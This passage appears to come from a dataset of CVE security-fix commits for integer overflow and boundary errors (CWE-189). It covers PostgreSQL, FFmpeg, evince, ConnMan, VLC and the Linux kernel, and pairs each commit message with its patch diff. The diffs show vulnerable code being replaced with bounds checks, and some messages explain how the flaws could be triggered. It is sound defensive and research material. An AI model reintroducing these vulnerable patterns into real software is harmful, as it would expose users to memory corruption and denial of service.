a\/src\/backend\/utils\/adt\/varbit.c b\/src\/backend\/utils\/adt\/varbit.c\nindex 22c04be307c2..e3de952863d9 100644\n--- a\/src\/backend\/utils\/adt\/varbit.c\n+++ b\/src\/backend\/utils\/adt\/varbit.c\n@@ -148,12 +148,22 @@ bit_in(PG_FUNCTION_ARGS)\n \t\tsp = input_string;\n \t}\n \n+\t\/*\n+\t * Determine bitlength from input string.  MaxAllocSize ensures a regular\n+\t * input is small enough, but we must check hex input.\n+\t *\/\n \tslen = strlen(sp);\n-\t\/* Determine bitlength from input string *\/\n \tif (bit_not_hex)\n \t\tbitlen = slen;\n \telse\n+\t{\n+\t\tif (slen > VARBITMAXLEN \/ 4)\n+\t\t\tereport(ERROR,\n+\t\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t\t errmsg(\"bit string length exceeds the maximum allowed (%d)\",\n+\t\t\t\t\t\tVARBITMAXLEN)));\n \t\tbitlen = slen * 4;\n+\t}\n \n \t\/*\n \t * Sometimes atttypmod is not supplied. If it is supplied we need to make\n@@ -450,12 +460,22 @@ varbit_in(PG_FUNCTION_ARGS)\n \t\tsp = input_string;\n \t}\n \n+\t\/*\n+\t * Determine bitlength from input string.  MaxAllocSize ensures a regular\n+\t * input is small enough, but we must check hex input.\n+\t *\/\n \tslen = strlen(sp);\n-\t\/* Determine bitlength from input string *\/\n \tif (bit_not_hex)\n \t\tbitlen = slen;\n \telse\n+\t{\n+\t\tif (slen > VARBITMAXLEN \/ 4)\n+\t\t\tereport(ERROR,\n+\t\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t\t errmsg(\"bit string length exceeds the maximum allowed (%d)\",\n+\t\t\t\t\t\tVARBITMAXLEN)));\n \t\tbitlen = slen * 4;\n+\t}\n \n \t\/*\n \t * Sometimes atttypmod is not supplied. If it is supplied we need to make\n@@ -535,6 +555,9 @@ varbit_in(PG_FUNCTION_ARGS)\n \/*\n  * varbit_out -\n  *\t  Prints the string as bits to preserve length accurately\n+ *\n+ * XXX varbit_recv() and hex input to varbit_in() can load a value that this\n+ * cannot emit.  Consider using hex output for such values.\n  *\/\n Datum\n varbit_out(PG_FUNCTION_ARGS)\n@@ -944,6 +967,11 @@ bit_catenate(VarBit *arg1, VarBit *arg2)\n \tbitlen1 = VARBITLEN(arg1);\n \tbitlen2 = VARBITLEN(arg2);\n \n+\tif (bitlen1 > VARBITMAXLEN - bitlen2)\n+\t\tereport(ERROR,\n+\t\t\t\t(errcode(ERRCODE_PROGRAM_LIMIT_EXCEEDED),\n+\t\t\t\t errmsg(\"bit string length exceeds the maximum allowed (%d)\",\n+\t\t\t\t\t\tVARBITMAXLEN)));\n \tbytelen = VARBITTOTALLEN(bitlen1 + bitlen2);\n \n \tresult = (VarBit *) palloc(bytelen);\ndiff --git a\/src\/include\/tsearch\/ts_type.h b\/src\/include\/tsearch\/ts_type.h\nindex 4e253fb9d3b0..df4a57825ecb 100644\n--- a\/src\/include\/tsearch\/ts_type.h\n+++ b\/src\/include\/tsearch\/ts_type.h\n@@ -13,6 +13,7 @@\n #define _PG_TSTYPE_H_\n \n #include \"fmgr.h\"\n+#include \"utils\/memutils.h\"\n #include \"utils\/pg_crc.h\"\n \n \n@@ -244,6 +245,8 @@ typedef TSQueryData *TSQuery;\n  * QueryItems, and lenofoperand is the total length of all operands\n  *\/\n #define COMPUTESIZE(size, lenofoperand) ( HDRSIZETQ + (size) * sizeof(QueryItem) + (lenofoperand) )\n+#define TSQUERY_TOO_BIG(size, lenofoperand) \\\n+\t((size) > (MaxAllocSize - HDRSIZETQ - (lenofoperand)) \/ sizeof(QueryItem))\n \n \/* Returns a pointer to the first QueryItem in a TSQuery *\/\n #define GETQUERY(x)  ((QueryItem*)( (char*)(x)+HDRSIZETQ ))\ndiff --git a\/src\/include\/utils\/varbit.h b\/src\/include\/utils\/varbit.h\nindex 773b4ce050e7..974de7db0923 100644\n--- a\/src\/include\/utils\/varbit.h\n+++ b\/src\/include\/utils\/varbit.h\n@@ -15,6 +15,8 @@\n #ifndef VARBIT_H\n #define VARBIT_H\n \n+#include <limits.h>\n+\n #include \"fmgr.h\"\n \n \/*\n@@ -53,6 +55,11 @@ typedef struct\n \/* Number of bytes needed to store a bit string of a given length *\/\n #define VARBITTOTALLEN(BITLEN)\t(((BITLEN) + BITS_PER_BYTE-1)\/BITS_PER_BYTE + \\\n \t\t\t\t\t\t\t\t VARHDRSZ + VARBITHDRSZ)\n+\/*\n+ * Maximum number of bits.  Several code sites assume no overflow from\n+ * computing bitlen + X; VARBITTOTALLEN() has the largest such X.\n+ *\/\n+#define VARBITMAXLEN\t\t(INT_MAX - BITS_PER_BYTE + 1)\n \/* pointer beyond the end of the bit string (like end() in STL containers) *\/\n #define VARBITEND(PTR)\t\t(((bits8 *) (PTR)) + VARSIZE(PTR))\n \/* Mask that will cover exactly one byte, i.e. BITS_PER_BYTE bits *\/\n","owner":"postgres","repo":"postgres","source":"cve"},{"CVE_ID":"CVE-2011-3362","CWE_ID":"189","category":"security","commit_id":"91d5da9321c52e8197fb14046ebb335f3e6ff4a0","commit_message":"From 91d5da9321c52e8197fb14046ebb335f3e6ff4a0 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Wed, 10 Aug 2011 13:28:36 +0200\nSubject: [PATCH] cavs: fix oCERT #2011-002 FFmpeg\/libavcodec insufficient\n boundary check\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/cavsdec.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/libavcodec\/cavsdec.c b\/libavcodec\/cavsdec.c\nindex c6ccb06524..6e83a7d381 100644\n--- a\/libavcodec\/cavsdec.c\n+++ b\/libavcodec\/cavsdec.c\n@@ -115,7 +115,8 @@ static inline int get_ue_code(GetBitContext *gb, int order) {\n static int decode_residual_block(AVSContext *h, GetBitContext *gb,\n                                  const struct dec_2dvlc *r, int esc_golomb_order,\n                                  int qp, uint8_t *dst, int stride) {\n-    int i, level_code, esc_code, level, run, mask;\n+    int i, esc_code, level, mask;\n+    unsigned int level_code, run;\n     DCTELEM level_buf[65];\n     uint8_t run_buf[65];\n     DCTELEM *block = h->block;\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2010-2640","CWE_ID":"189","category":"security","commit_id":"d4139205b010ed06310d14284e63114e88ec6de2","commit_message":"From d4139205b010ed06310d14284e63114e88ec6de2 Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Jos=C3=A9=20Aliste?= <jaliste@src.gnome.org>\nDate: Tue, 7 Dec 2010 15:56:47 -0300\nSubject: [PATCH] backends: Fix several security issues in the dvi-backend.\n\nSee CVE-2010-2640, CVE-2010-2641, CVE-2010-2642 and  CVE-2010-2643.\n---\n backend\/dvi\/mdvi-lib\/afmparse.c |  2 +-\n backend\/dvi\/mdvi-lib\/dviread.c  |  4 ++++\n backend\/dvi\/mdvi-lib\/pk.c       | 11 ++++++++++-\n backend\/dvi\/mdvi-lib\/tfmfile.c  |  3 ++-\n backend\/dvi\/mdvi-lib\/vf.c       |  6 ++++++\n 5 files changed, 23 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/backend\/dvi\/mdvi-lib\/afmparse.c b\/backend\/dvi\/mdvi-lib\/afmparse.c\nindex 164366b0..361e23d6 100644\n--- a\/backend\/dvi\/mdvi-lib\/afmparse.c\n+++ b\/backend\/dvi\/mdvi-lib\/afmparse.c\n@@ -160,7 +160,7 @@ static char *token(FILE *stream)\n     \n     idx = 0;\n     while (ch != EOF && ch != ' ' && ch != lineterm \n-           && ch != '\\t' && ch != ':' && ch != ';') \n+           && ch != '\\t' && ch != ':' && ch != ';' && idx < MAX_NAME)\n     {\n         ident[idx++] = ch;\n         ch = fgetc(stream);\ndiff --git a\/backend\/dvi\/mdvi-lib\/dviread.c b\/backend\/dvi\/mdvi-lib\/dviread.c\nindex cd8cfa91..d0143205 100644\n--- a\/backend\/dvi\/mdvi-lib\/dviread.c\n+++ b\/backend\/dvi\/mdvi-lib\/dviread.c\n@@ -1507,6 +1507,10 @@ int\tspecial(DviContext *dvi, int opcode)\n \tInt32\targ;\n \t\n \targ = dugetn(dvi, opcode - DVI_XXX1 + 1);\n+\tif (arg <= 0) {\n+\t\tdvierr(dvi, _(\"malformed special length\\n\"));\n+\t\treturn -1;\n+\t}\n \ts = mdvi_malloc(arg + 1);\n \tdread(dvi, s, arg);\n \ts[arg] = 0;\ndiff --git a\/backend\/dvi\/mdvi-lib\/pk.c b\/backend\/dvi\/mdvi-lib\/pk.c\nindex a5791869..08377e63 100644\n--- a\/backend\/dvi\/mdvi-lib\/pk.c\n+++ b\/backend\/dvi\/mdvi-lib\/pk.c\n@@ -469,6 +469,15 @@ static int pk_load_font(DviParams *unused, DviFont *font)\n \t\t\t}\n \t\t\tif(feof(p))\n \t\t\t\tbreak;\n+\n+\t\t\t\/* Although the PK format support bigger char codes,\n+                         * XeTeX and other extended TeX engines support charcodes up to\n+                         * 65536, while normal TeX engine supports only charcode up to 255.*\/\n+\t\t\tif (cc < 0 || cc > 65536) {\n+\t\t\t\tmdvi_error (_(\"%s: unexpected charcode (%d)\\n\"),\n+\t\t\t\t\t    font->fontname,cc);\n+\t\t\t\tgoto error;\n+\t\t\t} \n \t\t\tif(cc < loc)\n \t\t\t\tloc = cc;\n \t\t\tif(cc > hic)\n@@ -512,7 +521,7 @@ static int pk_load_font(DviParams *unused, DviFont *font)\n \t}\n \n \t\/* resize font char data *\/\n-\tif(loc > 0 || hic < maxch-1) {\n+\tif(loc > 0 && hic < maxch-1) {\n \t\tmemmove(font->chars, font->chars + loc, \n \t\t\t(hic - loc + 1) * sizeof(DviFontChar));\n \t\tfont->chars = xresize(font->chars,\ndiff --git a\/backend\/dvi\/mdvi-lib\/tfmfile.c b\/backend\/dvi\/mdvi-lib\/tfmfile.c\nindex 73ebf26a..8c2a30b2 100644\n--- a\/backend\/dvi\/mdvi-lib\/tfmfile.c\n+++ b\/backend\/dvi\/mdvi-lib\/tfmfile.c\n@@ -172,7 +172,8 @@ int\ttfm_load_file(const char *filename, TFMInfo *info)\n \t\/* We read the entire TFM file into core *\/\n \tif(fstat(fileno(in), &st) < 0)\n \t\treturn -1;\n-\tif(st.st_size == 0)\n+\t\/* according to the spec, TFM files are smaller than 16K *\/\n+\tif(st.st_size == 0 || st.st_size >= 16384)\n \t\tgoto bad_tfm;\n \n \t\/* allocate a word-aligned buffer to hold the file *\/\ndiff --git a\/backend\/dvi\/mdvi-lib\/vf.c b\/backend\/dvi\/mdvi-lib\/vf.c\nindex fb498476..a5ae3bbe 100644\n--- a\/backend\/dvi\/mdvi-lib\/vf.c\n+++ b\/backend\/dvi\/mdvi-lib\/vf.c\n@@ -165,6 +165,12 @@ static int vf_load_font(DviParams *params, DviFont *font)\n \t\t\tcc = fuget1(p);\n \t\t\ttfm = fuget3(p);\n \t\t}\n+\t\tif (cc < 0 || cc > 65536) {\n+\t\t\t\/* TeX engines do not support char codes bigger than 65535 *\/\n+\t\t\tmdvi_error(_(\"(vf) %s: unexpected character %d\\n\"),\n+\t\t\t\t   font->fontname, cc);\n+\t\t\tgoto error;\n+\t\t}\n \t\tif(loc < 0 || cc < loc)\n \t\t\tloc = cc;\n \t\tif(hic < 0 || cc > hic)\n-- \n2.21.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2012-2322","CWE_ID":"189","category":"security","commit_id":"1d1a22fe586a455935483708fbe8eaeada79df7f","commit_message":"From 1d1a22fe586a455935483708fbe8eaeada79df7f Mon Sep 17 00:00:00 2001\nFrom: Patrik Flykt <patrik.flykt@linux.intel.com>\nDate: Thu, 3 May 2012 16:28:40 +0300\nSubject: gdhcp: Fix packet length checking\n\nFix packet length checking where payload length could have been zero.\nAlso check that we don't set the option pointer beyond the end of the\npacket payload.\n---\n gdhcp\/common.c | 18 +++++++++++++++---\n 1 file changed, 15 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/gdhcp\/common.c b\/gdhcp\/common.c\nindex 91c428c1..8d5c284b 100644\n--- a\/gdhcp\/common.c\n+++ b\/gdhcp\/common.c\n@@ -155,14 +155,16 @@ uint8_t *dhcpv6_get_option(struct dhcpv6_packet *packet, uint16_t pkt_len,\n \trem = pkt_len - 1 - 3;\n \n \tif (rem <= 0)\n-\t\t\/* Bad packet *\/\n-\t\treturn NULL;\n+\t\tgoto bad_packet;\n \n \twhile (1) {\n \t\topt_code = optionptr[0] << 8 | optionptr[1];\n \t\topt_len = len = optionptr[2] << 8 | optionptr[3];\n \t\tlen += 2 + 2; \/* skip code and len *\/\n \n+\t\tif (len < 4)\n+\t\t\tgoto bad_packet;\n+\n \t\trem -= len;\n \t\tif (rem < 0)\n \t\t\tbreak;\n@@ -170,7 +172,10 @@ uint8_t *dhcpv6_get_option(struct dhcpv6_packet *packet, uint16_t pkt_len,\n \t\tif (opt_code == code) {\n \t\t\tif (option_len != NULL)\n \t\t\t\t*option_len = opt_len;\n-\t\t\tfound = optionptr + 2 + 2;\n+\t\t\tif (rem == 0)\n+\t\t\t\tfound = NULL;\n+\t\t\telse\n+\t\t\t\tfound = optionptr + 2 + 2;\n \t\t\tcount++;\n \t\t}\n \n@@ -184,6 +189,13 @@ uint8_t *dhcpv6_get_option(struct dhcpv6_packet *packet, uint16_t pkt_len,\n \t\t*option_count = count;\n \n \treturn found;\n+\n+bad_packet:\n+\tif (option_len != NULL)\n+\t\t*option_len = 0;\n+\tif (option_count != NULL)\n+\t\t*option_count = 0;\n+\treturn NULL;\n }\n \n uint8_t *dhcpv6_get_sub_option(unsigned char *option, uint16_t max_len,\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-8364","CWE_ID":"189","category":"security","commit_id":"df91aa034b82b77a3c4e01791f4a2b2ff6c82066","commit_message":"From df91aa034b82b77a3c4e01791f4a2b2ff6c82066 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michael@niedermayer.cc>\nDate: Sat, 14 Nov 2015 02:36:22 +0100\nSubject: [PATCH] avcodec\/ivi: Check image dimensions\n\nFixes integer overflow\nFixes: 1e32c6c591d940337c20b197ec1c4d3d\/asan_heap-oob_4a52e5_8946_0bb0d9e863def56005e49f1d89bdc94d.avi\n\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>\n---\n libavcodec\/ivi.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/libavcodec\/ivi.c b\/libavcodec\/ivi.c\nindex 4525ff494c..eab42bb535 100644\n--- a\/libavcodec\/ivi.c\n+++ b\/libavcodec\/ivi.c\n@@ -30,6 +30,7 @@\n \n #define BITSTREAM_READER_LE\n #include \"libavutil\/attributes.h\"\n+#include \"libavutil\/imgutils.h\"\n #include \"libavutil\/timer.h\"\n #include \"avcodec.h\"\n #include \"get_bits.h\"\n@@ -310,7 +311,7 @@ av_cold int ff_ivi_init_planes(IVIPlaneDesc *planes, const IVIPicConfig *cfg,\n \n     ivi_free_buffers(planes);\n \n-    if (cfg->pic_width < 1 || cfg->pic_height < 1 ||\n+    if (av_image_check_size(cfg->pic_width, cfg->pic_height, 0, NULL) < 0 ||\n         cfg->luma_bands < 1 || cfg->chroma_bands < 1)\n         return AVERROR_INVALIDDATA;\n \n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-1044","CWE_ID":"189","category":"security","commit_id":"7182afea8d1afd432a17c18162cc3fd441d0da93","commit_message":"From 7182afea8d1afd432a17c18162cc3fd441d0da93 Mon Sep 17 00:00:00 2001\nFrom: Dan Carpenter <error27@gmail.com>\nDate: Wed, 13 Oct 2010 09:13:12 +0000\nSubject: IB\/uverbs: Handle large number of entries in poll CQ\n\nIn ib_uverbs_poll_cq() code there is a potential integer overflow if\nuserspace passes in a large cmd.ne.  The calls to kmalloc() would\nallocate smaller buffers than intended, leading to memory corruption.\nThere iss also an information leak if resp wasn't all used.\nUnprivileged userspace may call this function, although only if an\nRDMA device that uses this function is present.\n\nFix this by copying CQ entries one at a time, which avoids the\nallocation entirely, and also by moving this copying into a function\nthat makes sure to initialize all memory copied to userspace.\n\nSpecial thanks to Jason Gunthorpe <jgunthorpe@obsidianresearch.com>\nfor his help and advice.\n\nCc: <stable@kernel.org>\nSigned-off-by: Dan Carpenter <error27@gmail.com>\n\n[ Monkey around with things a bit to avoid bad code generation by gcc\n  when designated initializers are used.  - Roland ]\n\nSigned-off-by: Roland Dreier <rolandd@cisco.com>\n---\n drivers\/infiniband\/core\/uverbs_cmd.c | 99 ++++++++++++++++++++----------------\n 1 file changed, 56 insertions(+), 43 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/infiniband\/core\/uverbs_cmd.c b\/drivers\/infiniband\/core\/uverbs_cmd.c\nindex b342248aec05..c42699285f8e 100644\n--- a\/drivers\/infiniband\/core\/uverbs_cmd.c\n+++ b\/drivers\/infiniband\/core\/uverbs_cmd.c\n@@ -893,68 +893,81 @@ out:\n \treturn ret ? ret : in_len;\n }\n \n+static int copy_wc_to_user(void __user *dest, struct ib_wc *wc)\n+{\n+\tstruct ib_uverbs_wc tmp;\n+\n+\ttmp.wr_id\t\t= wc->wr_id;\n+\ttmp.status\t\t= wc->status;\n+\ttmp.opcode\t\t= wc->opcode;\n+\ttmp.vendor_err\t\t= wc->vendor_err;\n+\ttmp.byte_len\t\t= wc->byte_len;\n+\ttmp.ex.imm_data\t\t= (__u32 __force) wc->ex.imm_data;\n+\ttmp.qp_num\t\t= wc->qp->qp_num;\n+\ttmp.src_qp\t\t= wc->src_qp;\n+\ttmp.wc_flags\t\t= wc->wc_flags;\n+\ttmp.pkey_index\t\t= wc->pkey_index;\n+\ttmp.slid\t\t= wc->slid;\n+\ttmp.sl\t\t\t= wc->sl;\n+\ttmp.dlid_path_bits\t= wc->dlid_path_bits;\n+\ttmp.port_num\t\t= wc->port_num;\n+\ttmp.reserved\t\t= 0;\n+\n+\tif (copy_to_user(dest, &tmp, sizeof tmp))\n+\t\treturn -EFAULT;\n+\n+\treturn 0;\n+}\n+\n ssize_t ib_uverbs_poll_cq(struct ib_uverbs_file *file,\n \t\t\t  const char __user *buf, int in_len,\n \t\t\t  int out_len)\n {\n \tstruct ib_uverbs_poll_cq       cmd;\n-\tstruct ib_uverbs_poll_cq_resp *resp;\n+\tstruct ib_uverbs_poll_cq_resp  resp;\n+\tu8 __user                     *header_ptr;\n+\tu8 __user                     *data_ptr;\n \tstruct ib_cq                  *cq;\n-\tstruct ib_wc                  *wc;\n-\tint                            ret = 0;\n-\tint                            i;\n-\tint                            rsize;\n+\tstruct ib_wc                   wc;\n+\tint                            ret;\n \n \tif (copy_from_user(&cmd, buf, sizeof cmd))\n \t\treturn -EFAULT;\n \n-\twc = kmalloc(cmd.ne * sizeof *wc, GFP_KERNEL);\n-\tif (!wc)\n-\t\treturn -ENOMEM;\n-\n-\trsize = sizeof *resp + cmd.ne * sizeof(struct ib_uverbs_wc);\n-\tresp = kmalloc(rsize, GFP_KERNEL);\n-\tif (!resp) {\n-\t\tret = -ENOMEM;\n-\t\tgoto out_wc;\n-\t}\n-\n \tcq = idr_read_cq(cmd.cq_handle, file->ucontext, 0);\n-\tif (!cq) {\n-\t\tret = -EINVAL;\n-\t\tgoto out;\n-\t}\n+\tif (!cq)\n+\t\treturn -EINVAL;\n \n-\tresp->count = ib_poll_cq(cq, cmd.ne, wc);\n+\t\/* we copy a struct ib_uverbs_poll_cq_resp to user space *\/\n+\theader_ptr = (void __user *)(unsigned long) cmd.response;\n+\tdata_ptr = header_ptr + sizeof resp;\n \n-\tput_cq_read(cq);\n+\tmemset(&resp, 0, sizeof resp);\n+\twhile (resp.count < cmd.ne) {\n+\t\tret = ib_poll_cq(cq, 1, &wc);\n+\t\tif (ret < 0)\n+\t\t\tgoto out_put;\n+\t\tif (!ret)\n+\t\t\tbreak;\n+\n+\t\tret = copy_wc_to_user(data_ptr, &wc);\n+\t\tif (ret)\n+\t\t\tgoto out_put;\n \n-\tfor (i = 0; i < resp->count; i++) {\n-\t\tresp->wc[i].wr_id \t   = wc[i].wr_id;\n-\t\tresp->wc[i].status \t   = wc[i].status;\n-\t\tresp->wc[i].opcode \t   = wc[i].opcode;\n-\t\tresp->wc[i].vendor_err \t   = wc[i].vendor_err;\n-\t\tresp->wc[i].byte_len \t   = wc[i].byte_len;\n-\t\tresp->wc[i].ex.imm_data    = (__u32 __force) wc[i].ex.imm_data;\n-\t\tresp->wc[i].qp_num \t   = wc[i].qp->qp_num;\n-\t\tresp->wc[i].src_qp \t   = wc[i].src_qp;\n-\t\tresp->wc[i].wc_flags \t   = wc[i].wc_flags;\n-\t\tresp->wc[i].pkey_index \t   = wc[i].pkey_index;\n-\t\tresp->wc[i].slid \t   = wc[i].slid;\n-\t\tresp->wc[i].sl \t\t   = wc[i].sl;\n-\t\tresp->wc[i].dlid_path_bits = wc[i].dlid_path_bits;\n-\t\tresp->wc[i].port_num \t   = wc[i].port_num;\n+\t\tdata_ptr += sizeof(struct ib_uverbs_wc);\n+\t\t++resp.count;\n \t}\n \n-\tif (copy_to_user((void __user *) (unsigned long) cmd.response, resp, rsize))\n+\tif (copy_to_user(header_ptr, &resp, sizeof resp)) {\n \t\tret = -EFAULT;\n+\t\tgoto out_put;\n+\t}\n \n-out:\n-\tkfree(resp);\n+\tret = in_len;\n \n-out_wc:\n-\tkfree(wc);\n-\treturn ret ? ret : in_len;\n+out_put:\n+\tput_cq_read(cq);\n+\treturn ret;\n }\n \n ssize_t ib_uverbs_req_notify_cq(struct ib_uverbs_file *file,\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2010-2062","CWE_ID":"189","category":"security","commit_id":"dc74600c97eb834c08674676e209afa842053aca","commit_message":"From dc74600c97eb834c08674676e209afa842053aca Mon Sep 17 00:00:00 2001\nFrom: =?utf8?q?R=C3=A9mi=20Denis-Courmont?= <remi@remlab.net>\nDate: Sun, 26 Jul 2009 18:39:42 +0300\nSubject: [PATCH] Real pseudo-RTSP: prevent integer underflow\n\nPointed-out-by: tixxDZ <tixxdz@gmail.com> - DZCORE Labs, Algeria\n---\n modules\/access\/rtsp\/real.c | 1 +\n 1 file changed, 1 insertion(+)\n\n","diff_code":"diff --git a\/modules\/access\/rtsp\/real.c b\/modules\/access\/rtsp\/real.c\nindex ccc7e54a05..fdd8dd1972 100644\n--- a\/modules\/access\/rtsp\/real.c\n+++ b\/modules\/access\/rtsp\/real.c\n@@ -600,6 +600,7 @@ int real_get_rdt_chunk(rtsp_client_t *rtsp_session, rmff_pheader_t *ph,\n \n   int n;\n   rmff_dump_pheader(ph, (char*)*buffer);\n+  if (pf->length<12) return 0;\n   n=rtsp_read_data(rtsp_session, (uint8_t*)(*buffer + 12), ph->length - 12);\n   return (n <= 0) ? 0 : n+12;\n }\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-3601","CWE_ID":"189","category":"security","commit_id":"350b8bdd689cd2ab2c67c8a86a0be86cfa0751a7","commit_message":"From 350b8bdd689cd2ab2c67c8a86a0be86cfa0751a7 Mon Sep 17 00:00:00 2001\nFrom: \"Michael S. Tsirkin\" <mst@redhat.com>\nDate: Tue, 19 Aug 2014 19:14:50 +0800\nSubject: [PATCH] kvm: iommu: fix the third parameter of kvm_iommu_put_pages\n (CVE-2014-3601)\n\nThe third parameter of kvm_iommu_put_pages is wrong,\nIt should be 'gfn - slot->base_gfn'.\n\nBy making gfn very large, malicious guest or userspace can cause kvm to\ngo to this error path, and subsequently to pass a huge value as size.\nAlternatively if gfn is small, then pages would be pinned but never\nunpinned, causing host memory leak and local DOS.\n\nPassing a reasonable but large value could be the most dangerous case,\nbecause it would unpin a page that should have stayed pinned, and thus\nallow the device to DMA into arbitrary memory.  However, this cannot\nhappen because of the condition that can trigger the error:\n\n- out of memory (where you can't allocate even a single page)\n  should not be possible for the attacker to trigger\n\n- when exceeding the iommu's address space, guest pages after gfn\n  will also exceed the iommu's address space, and inside\n  kvm_iommu_put_pages() the iommu_iova_to_phys() will fail.  The\n  page thus would not be unpinned at all.\n\nReported-by: Jack Morgenstein <jackm@mellanox.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n---\n virt\/kvm\/iommu.c | 19 ++++++++++---------\n 1 file changed, 10 insertions(+), 9 deletions(-)\n\n","diff_code":"diff --git a\/virt\/kvm\/iommu.c b\/virt\/kvm\/iommu.c\nindex 0df7d4b34dfec..714b949323120 100644\n--- a\/virt\/kvm\/iommu.c\n+++ b\/virt\/kvm\/iommu.c\n@@ -61,6 +61,14 @@ static pfn_t kvm_pin_pages(struct kvm_memory_slot *slot, gfn_t gfn,\n \treturn pfn;\n }\n \n+static void kvm_unpin_pages(struct kvm *kvm, pfn_t pfn, unsigned long npages)\n+{\n+\tunsigned long i;\n+\n+\tfor (i = 0; i < npages; ++i)\n+\t\tkvm_release_pfn_clean(pfn + i);\n+}\n+\n int kvm_iommu_map_pages(struct kvm *kvm, struct kvm_memory_slot *slot)\n {\n \tgfn_t gfn, end_gfn;\n@@ -123,6 +131,7 @@ int kvm_iommu_map_pages(struct kvm *kvm, struct kvm_memory_slot *slot)\n \t\tif (r) {\n \t\t\tprintk(KERN_ERR \"kvm_iommu_map_address:\"\n \t\t\t       \"iommu failed to map pfn=%llx\\n\", pfn);\n+\t\t\tkvm_unpin_pages(kvm, pfn, page_size);\n \t\t\tgoto unmap_pages;\n \t\t}\n \n@@ -134,7 +143,7 @@ int kvm_iommu_map_pages(struct kvm *kvm, struct kvm_memory_slot *slot)\n \treturn 0;\n \n unmap_pages:\n-\tkvm_iommu_put_pages(kvm, slot->base_gfn, gfn);\n+\tkvm_iommu_put_pages(kvm, slot->base_gfn, gfn - slot->base_gfn);\n \treturn r;\n }\n \n@@ -266,14 +275,6 @@ int kvm_iommu_map_guest(struct kvm *kvm)\n \treturn r;\n }\n \n-static void kvm_unpin_pages(struct kvm *kvm, pfn_t pfn, unsigned long npages)\n-{\n-\tunsigned long i;\n-\n-\tfor (i = 0; i < npages; ++i)\n-\t\tkvm_release_pfn_clean(pfn + i);\n-}\n-\n static void kvm_iommu_put_pages(struct kvm *kvm,\n \t\t\t\tgfn_t base_gfn, unsigned long npages)\n {\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2012-3412","CWE_ID":"189","category":"security","commit_id":"68cb695ccecf949d48949e72f8ce591fdaaa325c","commit_message":"From 68cb695ccecf949d48949e72f8ce591fdaaa325c Mon Sep 17 00:00:00 2001\nFrom: Ben Hutchings <bhutchings@solarflare.com>\nDate: Mon, 30 Jul 2012 15:57:44 +0000\nSubject: [PATCH] sfc: Fix maximum number of TSO segments and minimum TX queue\n size\n\n[ Upstream commit 7e6d06f0de3f74ca929441add094518ae332257c ]\n\nCurrently an skb requiring TSO may not fit within a minimum-size TX\nqueue.  The TX queue selected for the skb may stall and trigger the TX\nwatchdog repeatedly (since the problem skb will be retried after the\nTX reset).  This issue is designated as CVE-2012-3412.\n\nSet the maximum number of TSO segments for our devices to 100.  This\nshould make no difference to behaviour unless the actual MSS is less\nthan about 700.  Increase the minimum TX queue size accordingly to\nallow for 2 worst-case skbs, so that there will definitely be space\nto add an skb after we wake a queue.\n\nTo avoid invalidating existing configurations, change\nefx_ethtool_set_ringparam() to fix up values that are too small rather\nthan returning -EINVAL.\n\nSigned-off-by: Ben Hutchings <bhutchings@solarflare.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\nSigned-off-by: Ben Hutchings <ben@decadent.org.uk>\n---\n drivers\/net\/ethernet\/sfc\/efx.c     |  6 ++++++\n drivers\/net\/ethernet\/sfc\/efx.h     | 14 ++++++++++----\n drivers\/net\/ethernet\/sfc\/ethtool.c | 16 +++++++++++-----\n drivers\/net\/ethernet\/sfc\/nic.h     |  3 +++\n drivers\/net\/ethernet\/sfc\/tx.c      | 19 +++++++++++++++++++\n 5 files changed, 49 insertions(+), 9 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/net\/ethernet\/sfc\/efx.c b\/drivers\/net\/ethernet\/sfc\/efx.c\nindex d5731f1fe6d67..a6611f1c48f90 100644\n--- a\/drivers\/net\/ethernet\/sfc\/efx.c\n+++ b\/drivers\/net\/ethernet\/sfc\/efx.c\n@@ -1383,6 +1383,11 @@ static int efx_probe_all(struct efx_nic *efx)\n \t\tgoto fail2;\n \t}\n \n+\tBUILD_BUG_ON(EFX_DEFAULT_DMAQ_SIZE < EFX_RXQ_MIN_ENT);\n+\tif (WARN_ON(EFX_DEFAULT_DMAQ_SIZE < EFX_TXQ_MIN_ENT(efx))) {\n+\t\trc = -EINVAL;\n+\t\tgoto fail3;\n+\t}\n \tefx->rxq_entries = efx->txq_entries = EFX_DEFAULT_DMAQ_SIZE;\n \trc = efx_probe_channels(efx);\n \tif (rc)\n@@ -1973,6 +1978,7 @@ static int efx_register_netdev(struct efx_nic *efx)\n \tnet_dev->irq = efx->pci_dev->irq;\n \tnet_dev->netdev_ops = &efx_netdev_ops;\n \tSET_ETHTOOL_OPS(net_dev, &efx_ethtool_ops);\n+\tnet_dev->gso_max_segs = EFX_TSO_MAX_SEGS;\n \n 